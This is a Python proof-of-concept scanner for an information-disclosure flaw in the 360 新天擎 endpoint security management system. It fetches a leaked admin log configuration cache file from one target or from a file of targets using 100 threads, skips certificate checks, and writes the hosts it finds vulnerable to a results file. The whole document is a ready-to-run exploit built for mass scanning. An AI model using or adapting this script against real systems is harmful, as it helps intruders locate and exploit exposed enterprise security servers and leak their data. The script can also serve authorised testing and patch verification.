# 360 新天擎终端安全管理系统信息泄露漏洞

import requests, re, os, sys, argparse
from multiprocessing.dummy import Pool

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def banner():
    test = """
    ██████╗  ██████╗  ██████╗       ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗    ██╗     ███████╗ █████╗ ██╗  ██╗ █████╗  ██████╗ ███████╗
    ╚════██╗██╔════╝ ██╔═████╗      ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║    ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝
     █████╔╝███████╗ ██║██╔██║█████╗██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║    ██║     █████╗  ███████║█████╔╝ ███████║██║  ███╗█████╗  
     ╚═══██╗██╔═══██╗████╔╝██║╚════╝██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║    ██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══██║██║   ██║██╔══╝  
    ██████╔╝╚██████╔╝╚██████╔╝      ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║    ███████╗███████╗██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗
    ╚═════╝  ╚═════╝  ╚═════╝       ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝

                                                                                                                                                                                       author:秋妤
                                                                                                                                                                                       date:2024.09.03
                                                                                                                                                                                       version:1.0                                                                                                          
    """
    print(test)


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="这是一个关于360天擎信息泄露的脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter your url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
        content = re.findall(r's:12:"(.*?)"', res1.text, re.S)
        if '/login/login' in content:
            print(f"[+]{target}存在漏洞")
            with open('360新天擎信息泄露漏洞_result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        elif res1.status_code != 200:
            print(f"[+]{target}页面可能存在问题，请手工检测")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
